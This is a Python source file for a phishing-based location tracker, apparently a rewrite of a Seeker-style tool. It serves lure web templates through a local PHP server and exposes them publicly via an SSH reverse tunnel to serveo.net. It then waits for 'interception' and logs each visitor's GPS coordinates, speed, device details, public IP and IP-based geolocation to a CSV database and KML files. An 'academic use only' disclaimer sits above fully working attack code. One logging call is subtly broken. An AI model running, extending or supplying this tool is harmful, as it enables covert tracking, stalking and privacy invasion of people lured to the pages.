#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
newtoxton.py - Improved academic / security-assessment edition
--------------------------------------------------------------
Drop-in replacement for the original newtoxton-locator script.

Improvements:
- Iterative capture loop (no recursion)
- Proper process-group cleanup for SSH & PHP
- Reduced busy-waiting
- Human-readable location output (locality + coordinates)
- Better error handling and resource management
- Same CLI, templates, KML and CSV behaviour

Academic use only – test only systems you own or have explicit permission to assess.
"""

from __future__ import annotations

import argparse
import csv
import json
import os
import re
import signal
import subprocess
import sys
import time
from pathlib import Path
from shutil import which
from typing import Any, List, Optional, Tuple

import requests

# ---------------------------------------------------------------------------
# Terminal colours
# ---------------------------------------------------------------------------
R = "\033[31m"
G = "\033[32m"
C = "\033[36m"
W = "\033[0m"

VERSION = "1.2.5-academic"

_ssh_proc: Optional[subprocess.Popen] = None
_php_proc: Optional[subprocess.Popen] = None


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def log_ok(msg: str) -> None:
    print(f"{G}[+]{C} {msg}{W}")


def log_err(msg: str) -> None:
    print(f"{R}[-]{C} {msg}{W}")


def log_info(msg: str) -> None:
    print(f"{G}[>]{C} {msg}{W}")


def sanitize_subdomain(sub: Optional[str]) -> Optional[str]:
    if sub is None:
        return None
    if not re.fullmatch(r"[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?", sub):
        log_err("Invalid subdomain – only letters, digits and hyphens allowed")
        sys.exit(1)
    return sub


def ensure_dirs() -> None:
    for d in ("logs", "db", "template"):
        Path(d).mkdir(parents=True, exist_ok=True)


# ---------------------------------------------------------------------------
# Banner & version check
# ---------------------------------------------------------------------------
def banner() -> None:
    print(
        G
        + r"""
███╗░░██╗███████╗░██╗░░░░░░░██╗████████╗░█████╗░██╗░░██╗████████╗░█████╗░███╗░░██╗
████╗░██║██╔════╝░██║░░██╗░░██║╚══██╔══╝██╔══██╗╚██╗██╔╝╚══██╔══╝██╔══██╗████╗░██║
██╔██╗██║█████╗░░░╚██╗████╗██╔╝░░░██║░░░██║░░██║░╚███╔╝░░░░██║░░░██║░░██║██╔██╗██║
██║╚████║██╔══╝░░░░████╔═████║░░░░██║░░░██║░░██║░██╔██╗░░░░██║░░░██║░░██║██║╚████║
██║░╚███║███████╗░░╚██╔╝░╚██╔╝░░░░██║░░░╚█████╔╝██╔╝╚██╗░░░██║░░░╚█████╔╝██║░╚███║
╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝░░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚══╝
"""
        + W
    )
    log_info("Created By : Newtoxton (academic rewrite)")
    log_info(f"Version    : {VERSION}\n")


def ver_check() -> None:
    print(f"{G}[+]{C} Checking for Updates.....", end="", flush=True)
    # Point this at your own repo if desired
    url = "https://raw.githubusercontent.com/Newtoxton/newtoxton-locator/master/version.txt"
    try:
        r = requests.get(url, timeout=8)
        if r.status_code == 200:
            remote = r.text.strip()
            if remote == VERSION.split("-")[0]:
                print(f"{C}[{G} Up-To-Date {C}]{W}\n")
            else:
                print(f"{C}[{G} Available : {remote} {C}]{W}\n")
        else:
            print(f"{C}[{R} Status : {r.status_code} {C}]{W}\n")
    except requests.RequestException as exc:
        print(f"\n{R}[-]{C} Version check failed: {exc}{W}")


# ---------------------------------------------------------------------------
# Template selection
# ---------------------------------------------------------------------------
def template_select() -> Tuple[str, Path, Path]:
    templates_file = Path("template/templates.json")
    if not templates_file.is_file():
        log_err(f"Cannot find {templates_file}")
        sys.exit(1)

    with templates_file.open(encoding="utf-8") as fh:
        data = json.load(fh)

    print(f"{G}[+]{C} Select a Template :{W}\n")
    for idx, item in enumerate(data["templates"]):
        print(f"{G}[{idx}]{C} {item['name']}{W}")

    try:
        choice = int(input(f"{G}[>] {W}"))
        selected = data["templates"][choice]
    except (ValueError, IndexError):
        log_err("Invalid selection")
        sys.exit(1)

    site = selected["dir_name"]
    log_ok(f"Loading {selected['name']} Template...")

    if selected.get("module"):
        import importlib
        importlib.import_module(f"template.{selected['import_file']}")

    info_path = Path(f"template/{site}/php/info.txt")
    result_path = Path(f"template/{site}/php/result.txt")
    return site, info_path, result_path


# ---------------------------------------------------------------------------
# Tunneling
# ---------------------------------------------------------------------------
def serveo(port: int, subdom: Optional[str]) -> None:
    global _ssh_proc

    log_ok("Checking Serveo Status...", end="")
    try:
        r = requests.get("https://serveo.net", timeout=6)
        if r.status_code != 200:
            print(f"{C}[{R} Status : {r.status_code}{C}]{W}")
            sys.exit(1)
        print(f"{C}[{G} Online {C}]{W}\n")
    except requests.RequestException:
        print(f"{C}[{R} Offline {C}]{W}")
        sys.exit(1)

    log_ok("Getting Serveo URL...\n")

    log_file = Path("logs/serveo.txt")
    log_file.write_text("", encoding="utf-8")

    remote = f"{subdom}.serveo.net:80:localhost:{port}" if subdom else f"80:localhost:{port}"

    cmd = [
        "ssh",
        "-o", "StrictHostKeyChecking=accept-new",
        "-o", "ServerAliveInterval=60",
        "-o", "ServerAliveCountMax=3",
        "-R", remote,
        "serveo.net",
    ]

    _ssh_proc = subprocess.Popen(
        cmd,
        stdout=log_file.open("w", encoding="utf-8"),
        stderr=subprocess.STDOUT,
        stdin=subprocess.DEVNULL,
        start_new_session=True,
    )

    url = None
    for _ in range(15):
        time.sleep(2)
        content = log_file.read_text(encoding="utf-8", errors="replace")
        for line in content.splitlines():
            if "HTTP" in line and "serveo.net" in line:
                for part in line.split():
                    if part.startswith("http"):
                        url = part.strip()
                        break
            if url:
                break
        if url:
            break

    if not url:
        log_err("Failed to obtain Serveo URL – check logs/serveo.txt")
        cleanup()
        sys.exit(1)

    log_ok(f"URL : {W}{url}\n")


def tunnel_select(tunnel_mode: Optional[str], port: int, subdom: Optional[str]) -> None:
    if tunnel_mode is None:
        serveo(port, subdom)
    elif tunnel_mode == "manual":
        log_ok("Skipping Serveo – start your own tunnel manually...\n")
    else:
        log_err("Invalid Tunnel Mode – see -h")
        sys.exit(1)


# ---------------------------------------------------------------------------
# Local PHP server
# ---------------------------------------------------------------------------
def start_php_server(site: str, port: int) -> None:
    global _php_proc

    log_ok(f"Port : {port}")
    print(f"{G}[+]{C} Starting PHP Server......", end="", flush=True)

    log_file = Path("logs/php.log")
    cmd = ["php", "-S", f"0.0.0.0:{port}", "-t", f"template/{site}/"]
    _php_proc = subprocess.Popen(
        cmd,
        stdout=log_file.open("w", encoding="utf-8"),
        stderr=subprocess.STDOUT,
        start_new_session=True,
    )

    time.sleep(2)

    try:
        r = requests.get(f"http://127.0.0.1:{port}/index.html", timeout=4)
        if r.status_code == 200:
            print(f"{C}[{G} Success {C}]{W}")
        else:
            print(f"{C}[{R} Status : {r.status_code}{C}]{W}")
            cleanup()
            sys.exit(1)
    except requests.RequestException:
        print(f"{C}[{R} Failed {C}]{W}")
        cleanup()
        sys.exit(1)


# ---------------------------------------------------------------------------
# Reverse geocoding → readable address or lat/long
# ---------------------------------------------------------------------------
def get_readable_location(lat: float, lon: float) -> str:
    """
    Return a human-friendly location string.

    Preferred form:
        Seattle, Washington  |  47.60621, -122.33207
    Fallback:
        47.60621, -122.33207
    """
    try:
        resp = requests.get(
            "https://nominatim.openstreetmap.org/reverse",
            params={
                "lat": lat,
                "lon": lon,
                "format": "json",
                "addressdetails": 1,
                "zoom": 16,
            },
            headers={"User-Agent": "AcademicSeekerLab/1.2 (security-assessment module)"},
            timeout=6,
        )
        if resp.status_code == 200:
            data = resp.json()
            addr = data.get("address", {})

            city = (
                addr.get("city")
                or addr.get("town")
                or addr.get("village")
                or addr.get("hamlet")
                or addr.get("municipality")
                or ""
            )
            state = addr.get("state") or addr.get("region") or ""
            country = addr.get("country") or ""

            locality_parts = [p for p in (city, state) if p]
            locality = ", ".join(locality_parts) if locality_parts else country

            if locality:
                return f"{locality}  |  {lat:.5f}, {lon:.5f}"
            display = data.get("display_name", "")
            if display:
                return f"{display}  |  {lat:.5f}, {lon:.5f}"
    except (requests.RequestException, ValueError, KeyError):
        pass

    return f"{lat:.5f}, {lon:.5f}"


# ---------------------------------------------------------------------------
# Data handling
# ---------------------------------------------------------------------------
def clear_capture_files(info_path: Path, result_path: Path) -> None:
    info_path.write_text("", encoding="utf-8")
    result_path.write_text("", encoding="utf-8")


def parse_device_info(info_path: Path) -> List[Any]:
    row: List[Any] = []
    try:
        data = json.loads(info_path.read_text(encoding="utf-8"))
        dev = data["dev"][0]

        os_name = dev.get("os", "N/A")
        platform = dev.get("platform", "N/A")
        cores = dev.get("cores", "Not Available")
        ram = dev.get("ram", "N/A")
        vendor = dev.get("vendor", "N/A")
        render = dev.get("render", "N/A")
        resolution = f"{dev.get('wd', '?')}x{dev.get('ht', '?')}"
        browser = dev.get("browser", "N/A")
        ip = dev.get("ip", "N/A")

        row.extend([os_name, platform, cores, ram, vendor, render, resolution, browser, ip])

        print(f"\n{G}[+]{C} Device Information :{W}\n")
        print(f"{G}[+]{C} OS         : {W}{os_name}")
        print(f"{G}[+]{C} Platform   : {W}{platform}")
        print(f"{G}[+]{C} CPU Cores  : {W}{cores}")
        print(f"{G}[+]{C} RAM        : {W}{ram}")
        print(f"{G}[+]{C} GPU Vendor : {W}{vendor}")
        print(f"{G}[+]{C} GPU        : {W}{render}")
        print(f"{G}[+]{C} Resolution : {W}{resolution}")
        print(f"{G}[+]{C} Browser    : {W}{browser}")
        print(f"{G}[+]{C} Public IP  : {W}{ip}")

        try:
            geo = requests.get(f"http://free.ipwhois.io/json/{ip}", timeout=6)
            if geo.status_code == 200:
                g = geo.json()
                for key in ("continent", "country", "region", "city", "org", "isp"):
                    val = str(g.get(key, "N/A"))
                    row.append(val)
                    print(f"{G}[+]{C} {key.title():10} : {W}{val}")
        except (requests.RequestException, ValueError, KeyError):
            pass

    except (json.JSONDecodeError, KeyError, IndexError, OSError):
        pass
    return row


def parse_location(result_path: Path) -> Tuple[List[Any], Optional[float], Optional[float]]:
    extra: List[Any] = []
    lat = lon = None

    try:
        data = json.loads(result_path.read_text(encoding="utf-8"))
        info = data["info"][0]

        lat = float(info["lat"])
        lon = float(info["lon"])
        acc = f"{info['acc']} m"

        alt = info.get("alt") or ""
        alt = "Not Available" if alt == "" else f"{alt} m"

        direction = info.get("dir") or ""
        direction = "Not Available" if direction == "" else f"{direction} deg"

        speed = info.get("spd") or ""
        speed = "Not Available" if speed == "" else f"{speed} m/s"

        readable = get_readable_location(lat, lon)

        extra.extend([f"{lat} deg", f"{lon} deg", acc, alt, direction, speed, readable])

        print(f"\n{G}[+]{C} Location Information :{W}\n")
        print(f"{G}[+]{C} Address / Plus-Code form : {W}{readable}")
        print(f"{G}[+]{C} Latitude               : {W}{lat} deg")
        print(f"{G}[+]{C} Longitude              : {W}{lon} deg")
        print(f"{G}[+]{C} Accuracy               : {W}{acc}")
        print(f"{G}[+]{C} Altitude               : {W}{alt}")
        print(f"{G}[+]{C} Direction              : {W}{direction}")
        print(f"{G}[+]{C} Speed                  : {W}{speed}")

    except (json.JSONDecodeError, KeyError, IndexError, OSError, ValueError) as exc:
        log_err(f"Location parse error: {exc}")

    return extra, lat, lon


def write_kml(kml_name: str, lat: float, lon: float) -> None:
    sample = Path("template/sample.kml")
    if not sample.is_file():
        log_err("sample.kml not found – skipping KML generation")
        return
    text = sample.read_text(encoding="utf-8")
    text = text.replace("LONGITUDE", str(lon))
    text = text.replace("LATITUDE", str(lat))
    out = Path(f"{kml_name}.kml")
    out.write_text(text, encoding="utf-8")
    log_ok(f"KML File Generated : {out.resolve()}")


def append_csv(row: List[Any]) -> None:
    csv_path = Path("db/results.csv")
    with csv_path.open("a", newline="", encoding="utf-8") as fh:
        csv.writer(fh).writerow(row)
    log_ok(f"New Entry Added in Database : {csv_path.resolve()}")


# ---------------------------------------------------------------------------
# Main capture loop (iterative – no recursion)
# ---------------------------------------------------------------------------
def capture_loop(info_path: Path, result_path: Path, kml_fname: Optional[str]) -> None:
    printed_waiting = False
    while True:
        try:
            if result_path.stat().st_size == 0:
                if not printed_waiting:
                    log_ok("Waiting for Interception...\n")
                    printed_waiting = True
                time.sleep(1.5)
                continue

            printed_waiting = False
            row = parse_device_info(info_path)
            extra, lat, lon = parse_location(result_path)
            row.extend(extra)

            if lat is not None and lon is not None:
                maps = f"https://www.google.com/maps/place/{lat}+{lon}"
                print(f"\n{G}[+]{C} Google Maps : {W}{maps}")

                if kml_fname:
                    write_kml(kml_fname, lat, lon)

            if row:
                append_csv(row)

            clear_capture_files(info_path, result_path)
            print()

        except KeyboardInterrupt:
            raise
        except Exception as exc:  # noqa: BLE001
            log_err(f"Unexpected error in capture loop: {exc}")
            time.sleep(2)


# ---------------------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------------------
def cleanup() -> None:
    global _ssh_proc, _php_proc

    for proc, name in ((_php_proc, "PHP"), (_ssh_proc, "SSH")):
        if proc and proc.poll() is None:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                proc.wait(timeout=3)
            except (ProcessLookupError, subprocess.TimeoutExpired, OSError):
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                except Exception:
                    pass
            log_ok(f"{name} process terminated")

    _php_proc = _ssh_proc = None


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
def main() -> None:
    ensure_dirs()

    print(f"{G}[+]{C} Checking Dependencies...{W}")
    missing = [pkg for pkg in ("python3", "php", "ssh") if which(pkg) is None]
    if missing:
        for pkg in missing:
            log_err(f"{pkg} is not installed")
        sys.exit(1)

    parser = argparse.ArgumentParser(description="Academic Newtoxton-Locator")
    parser.add_argument("-s", "--subdomain", help="Custom Serveo subdomain (optional)")
    parser.add_argument("-k", "--kml", help="KML output filename (optional)")
    parser.add_argument("-t", "--tunnel", help="Tunnel mode [manual]")
    parser.add_argument("-p", "--port", type=int, default=8080, help="Web-server port")
    args = parser.parse_args()

    subdom = sanitize_subdomain(args.subdomain)
    kml_fname = args.kml
    tunnel_mode = args.tunnel
    port = args.port

    result_path = Path()

    try:
        banner()
        ver_check()
        tunnel_select(tunnel_mode, port, subdom)
        site, info_path, result_path = template_select()
        start_php_server(site, port)
        clear_capture_files(info_path, result_path)
        capture_loop(info_path, result_path, kml_fname)

    except KeyboardInterrupt:
        print(f"\n{R}[!]{C} Keyboard Interrupt.{W}")
    finally:
        cleanup()
        try:
            result_path.write_text("", encoding="utf-8")
        except Exception:
            pass
        sys.exit(0)


if __name__ == "__main__":
    main()
